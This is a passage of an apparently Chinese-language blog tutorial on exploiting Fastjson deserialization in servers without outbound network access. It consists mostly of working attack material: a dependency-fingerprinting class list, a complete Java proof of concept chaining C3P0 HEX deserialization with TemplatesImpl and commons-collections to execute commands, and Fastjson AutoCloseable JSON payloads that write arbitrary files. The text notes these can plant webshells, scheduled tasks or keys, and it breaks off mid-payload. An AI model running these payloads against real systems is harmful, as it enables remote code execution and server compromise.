class="line">15</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.web.bind.annotation.RequestMapping  <span class="comment">// SpringBoot</span></span><br><span class="line">org.apache.catalina.startup.Tomcat  <span class="comment">// Tomcat</span></span><br><span class="line">groovy.lang.GroovyShell  <span class="comment">// Groovy - 1.2.80</span></span><br><span class="line">com.mchange.v2.c3p0.DataSources  <span class="comment">// C3P0</span></span><br><span class="line">com.mysql.jdbc.Buffer  <span class="comment">// mysql-jdbc-5</span></span><br><span class="line">com.mysql.cj.api.authentication.AuthenticationProvider  <span class="comment">// mysql-connect-6</span></span><br><span class="line">com.mysql.cj.protocol.AuthenticationProvider <span class="comment">// mysql-connect-8</span></span><br><span class="line">sun.nio.cs.GBK  <span class="comment">// JDK8</span></span><br><span class="line">java.net.http.HttpClient  <span class="comment">// JDK11</span></span><br><span class="line">org.apache.ibatis.type.Alias  <span class="comment">// Mybatis</span></span><br><span class="line">org.apache.tomcat.dbcp.dbcp.BasicDataSource  <span class="comment">// tomcat-dbcp-7-BCEL</span></span><br><span class="line">org.apache.tomcat.dbcp.dbcp2.BasicDataSource <span class="comment">// tomcat-dbcp-8及以后-BCEL</span></span><br><span class="line">org.apache.commons.io.Charsets       <span class="comment">// 存在commons-io, 但不确定版本</span></span><br><span class="line">org.apache.commons.io.file.Counters  <span class="comment">// commons-io-2.7-2.8</span></span><br><span class="line">org.aspectj.ajde.Ajde  <span class="comment">// aspectjtools</span></span><br></pre></td></tr></table></figure><h3 id="不出网利用"><a href="#不出网利用" class="headerlink" title="不出网利用"></a>不出网利用</h3><h4 id="TemplatesImpl-1"><a href="#TemplatesImpl-1" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h4><p><font style="color:#000000;">上文已经分析过了，由于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl需要赋值的部分属性为private，因此利用条件较为苛刻，</font><strong><font style="color:#000000;">需要开启Feature.SupportNonPublicField</font></strong><font style="color:#000000;">。</font></p><h4 id="C3P0链HEX序列化字节加载器"><a href="#C3P0链HEX序列化字节加载器" class="headerlink" title="C3P0链HEX序列化字节加载器"></a>C3P0链HEX序列化字节加载器</h4><p><font style="color:#000000;">详细参考</font><a href="https://h3rmesk1t.github.io/2023/06/25/C3P0/#HEX%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E8%8A%82%E5%8A%A0%E8%BD%BD%E5%99%A8">HEX序列化字节加载器</a><font style="color:#000000;">，userOverridesAsString属性可控，导致可以从其setter方法setuserOverridesAsString开始到最后deserializeFromByteArray对其调用readObject进行反序列化，造成反序列化漏洞。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HexBase</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        ctConstructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(ctConstructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;h3&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> LazyMap.decorate(map1, invokerTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map2, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field1;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field1 = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            field1 = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> (HashMap) field1.get(hashSet);</span><br><span class="line"></span><br><span class="line">        Field field2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            field2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[])field2.get(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field field3;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field3 = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            field3 = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        field3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field3.set(node, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field4</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        field4.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field4.set(invokerTransformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> toHexAscii(tobyteArray(hashSet));</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span> + string + <span class="string">&quot;;\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">            addHexAscii(bytes[i], sw);</span><br><span class="line">        <span class="keyword">return</span> sw.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> out;</span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);</span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;</span><br><span class="line">        sw.write(toHexDigit(h1));</span><br><span class="line">        sw.write(toHexDigit(h2));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="文件读取写入"><a href="#文件读取写入" class="headerlink" title="文件读取写入"></a>文件读取写入</h4><p><font style="color:#000000;">在fastjson &lt;&#x3D; 1.2.68版本中，可以尝试利用预期类中的AutoCloseable进行文件读写操作，结合这个思路，可以尝试写入Webshell&#x2F;计划任务&#x2F;密钥等。</font></p><ol><li><font style="color:#000000;">JRE8环境下写入文件</font></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;out&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span>,</span><br><span class="line">            <span class="string">&quot;out&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.io.FileOutputStream&quot;</span>,</span><br><span class="line">                <span class="string">&quot;file&quot;</span>:<span class="string">&quot;/tmp/dest.txt&quot;</span>,</span><br><span class="line">                <span class="string">&quot;append&quot;</span>:<span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;infl&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;input&quot;</span>:<span class="string">&quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;bufLen&quot;</span>:<span class="number">1048576</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;protocolVersion&quot;</span>:<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><font style="color:#000000;">commons-io 2.0~2.6版本写入文件</font></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">    <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">      <span class="string">&quot;reader&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span>,</span><br><span class="line">        <span class="string">&quot;charSequence&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="string">&quot;bufferSize&quot;</span>:<span class="number">1024</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>,</span><br><span class="line">      <span class="string">&quot;writer&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span>,</span><br><span class="line">        <span class="string">&quot;file&quot;</span>:<span class="string">&quot;/tmp/pwned&quot;</span>,</span><br><span class="line">        <span class="string">&quot;encoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;append&quot;</span>: <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="string">&quot;bufferSize&quot;</span>: <span class="number">1024</span>,</span><br><span class="line">      <span class="string">&quot;writeImmediately&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;trigger&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">      <span class="string">&quot;is&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">      <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;trigger2&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">      <span class="string">&quot;is&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">      <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;trigger3&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">      <span class="string">&quot;is&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">      <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li><font style="color:#000000;">commons-io 2.7~2.8版本写入文件</font></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">    <span 